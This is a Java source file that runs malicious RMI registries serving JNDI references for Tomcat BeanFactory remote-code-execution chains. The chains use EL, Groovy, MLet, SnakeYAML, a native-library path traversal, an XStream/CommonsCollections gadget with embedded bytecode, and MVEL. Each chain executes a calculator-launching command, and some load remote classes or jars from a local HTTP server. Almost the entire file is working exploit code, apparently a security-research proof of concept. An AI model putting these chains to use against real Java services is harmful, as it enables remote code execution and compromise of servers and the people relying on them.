package jndi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.Reference;
import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @author Whoopsunix
 */
public class LocalBeanFactoryServer {
    public static void main(String args[]) throws Exception {
        TomcatEL();
        GroovyClassLoader();
        GroovyGroovyShell();
        MLet();
        Snakeyaml();
        Lib();
        XStream();
        mvel();

        System.out.println("server is running");
    }

    public static void TomcatEL() throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,
                "org.apache.naming.factory.BeanFactory", null);

        // BeanFactory.getObjectInstance
        ref.add(new StringRefAddr("forceString", "Whoopsunix=eval"));
        ref.add(new StringRefAddr("Whoopsunix", "Runtime.getRuntime().exec('open -a Calculator.app')"));
        // EL 表达式
//         ref.add(new StringRefAddr("Whoopsunix", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['open','-a','Calculator.app']).start()\")"));

        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("EL", referenceWrapper);
    }

    public static void GroovyClassLoader() throws Exception {
        Registry registry = LocateRegistry.createRegistry(1098);
        ResourceRef ref = new ResourceRef("groovy.lang.GroovyClassLoader", null, "", "", true,
                "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "Whoopsunix=parseClass"));
        String script = "@groovy.transform.ASTTest(value={\n" +
                "    assert java.lang.Runtime.getRuntime().exec(\"open -a Calculator.app\")\n" +
                "})\n" +
                "def x\n";
        ref.add(new StringRefAddr("Whoopsunix", script));

        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
        registry.bind("GroovyClassLoader", referenceWrapper);
    }

    public static void GroovyGroovyShell() throws Exception {
        Registry registry = LocateRegistry.createRegistry(1097);
        ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell", null, "", "", true,
                "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "Whoopsunix=evaluate"));
        ref.add(new StringRefAddr("Whoopsunix", "'open -a Calculator.app'.execute()"));

        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
        registry.bind("GroovyShell", referenceWrapper);
    }


    public static void MLet() throws Exception {
        Registry registry = LocateRegistry.createRegistry(1094);
        ResourceRef ref = new ResourceRef("javax.management.loading.MLet", null, "", "", true,
                "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=loadClass,b=addURL,c=loadClass"));
        ref.add(new StringRefAddr("a", "java.lang.String"));
        ref.add(new StringRefAddr("b", "http://127.0.0.1:1111/"));
        ref.add(new StringRefAddr("c", "Find"));

        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
        registry.bind("MLet", referenceWrapper);
    }

    public static void Snakeyaml() throws Exception {
        Registry registry = LocateRegistry.createRegistry(1093);
        ResourceRef ref = new ResourceRef("org.yaml.snakeyaml.Yaml", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);

        String jar = "!!javax.script.ScriptEngineManager [\n" +
                "  !!java.net.URLClassLoader [[\n" +
                "    !!java.net.URL [\"http://127.0.0.1:1234/SnakeyamlDemo-1.0.jar\"]\n" +
                "  ]]\n" +
                "]";

        ref.add(new StringRefAddr("forceString", "Whoopsunix=load"));
        ref.add(new StringRefAddr("Whoopsunix", jar));

        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
        registry.bind("Snakeyaml", referenceWrapper);
    }

    // todo 其他
    public static void Lib() throws Exception {
        Registry registry = LocateRegistry.createRegistry(1092);
        ResourceRef ref = new ResourceRef("com.sun.glass.utils.NativeLibLoader", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=loadLibrary"));
        ref.add(new StringRefAddr("a", "../../../../../../../../../../../../../../../../../../../../../../../../../../../../tmp/Exec"));

        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
        registry.bind("Lib", referenceWrapper);
    }

    public static void XStream() throws Exception {
        Registry registry = LocateRegistry.createRegistry(1091);
        ResourceRef ref = new ResourceRef("com.thoughtworks.xstream.XStream", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        String xml = "<java.util.PriorityQueue serialization=\"custom\">\n" +
                "  <unserializable-parents/>\n" +
                "  <java.util.PriorityQueue>\n" +
                "    <default>\n" +
                "      <size>2</size>\n" +
                "      <comparator class=\"org.apache.commons.collections4.comparators.TransformingComparator\">\n" +
                "        <decorated class=\"org.apache.commons.collections4.comparators.ComparableComparator\"/>\n" +
                "        <transformer class=\"org.apache.commons.collections4.functors.InvokerTransformer\">\n" +
                "          <iMethodName>newTransformer</iMethodName>\n" +
                "          <iParamTypes/>\n" +
                "          <iArgs/>\n" +
                "        </transformer>\n" +
                "      </comparator>\n" +
                "    </default>\n" +
                "    <int>3</int>\n" +
                "    <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl serialization=\"custom\">\n" +
                "      <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>\n" +
                "        <default>\n" +
                "          <__name>anyStr</__name>\n" +
                "          <__bytecodes>\n" +
                "            <byte-array>yv66vgAAADIAIAEAKW9yZy9hcGFjaGUvY29yZS9hc3luY2NvbnRleHRpbXBsL0NhdGFsaW5hBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEABjxpbml0PgEAAygpVgEABENvZGUMAAUABgoABAAIAQAgamF2YXgvc2NyaXB0L1NjcmlwdEVuZ2luZU1hbmFnZXIHAAoKAAsACAEAAmpzCAANAQAPZ2V0RW5naW5lQnlOYW1lAQAvKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvc2NyaXB0L1NjcmlwdEVuZ2luZTsMAA8AEAoACwARAQA+amF2YS5sYW5nLlJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoJ29wZW4gLWEgQ2FsY3VsYXRvci5hcHAnKTsIABMBABlqYXZheC9zY3JpcHQvU2NyaXB0RW5naW5lBwAVAQAEZXZhbAEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7DAAXABgLABYAGQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKBXHmae48bUcYAQANQ29uc3RhbnRWYWx1ZQAhAAIABAAAAAEAGgAbABwAAQAfAAAAAgAdAAEAAQAFAAYAAQAHAAAAKwACAAQAAAAfKrcACbsAC1m3AAxMKxIOtgASTRIUTiwtuQAaAgBXsQAAAAAAAA==</byte-array>\n" +
                "            <byte-array>yv66vgAAADIAEQEAPW9yZy9hcGFjaGUvcm9vdGV4dGVybmFsY29udGV4dHJlc291cmNlbG9hZGVyL215ZmFjZXMvUmVzb3VyY2UHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAUamF2YS9pby9TZXJpYWxpemFibGUHAAUBAAY8aW5pdD4BAAMoKVYBAARDb2RlDAAHAAgKAAQACgEAEHNlcmlhbFZlcnNpb25VSUQBAAFKBXHmae48bUcYAQANQ29uc3RhbnRWYWx1ZQAhAAIABAABAAYAAQAaAAwADQABABAAAAACAA4AAQABAAcACAABAAkAAAARAAEAAQAAAAUqtwALsQAAAAAAAA==</byte-array>\n" +
                "          </__bytecodes>\n" +
                "          <__transletIndex>0</__transletIndex>\n" +
                "          <__indentNumber>0</__indentNumber>\n" +
                "        </default>\n" +
                "        <boolean>false</boolean>\n" +
                "      </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>\n" +
                "    </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>\n" +
                "    <int>1</int>\n" +
                "  </java.util.PriorityQueue>\n" +
                "</java.util.PriorityQueue>";
        ref.add(new StringRefAddr("forceString", "Whoopsunix=fromXML"));
        ref.add(new StringRefAddr("Whoopsunix", xml));

        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
        registry.bind("XStream", referenceWrapper);
    }

    public static void mvel() throws Exception {
        Registry registry = LocateRegistry.createRegistry(1090);
        ResourceRef ref = new ResourceRef("org.mvel2.sh.ShellSession", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "Whoopsunix=exec"));
        ref.add(new StringRefAddr("Whoopsunix", "Runtime.getRuntime().exec(\"open -a Calculator.app\")"));

        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
        registry.bind("mvel", referenceWrapper);
    }


}
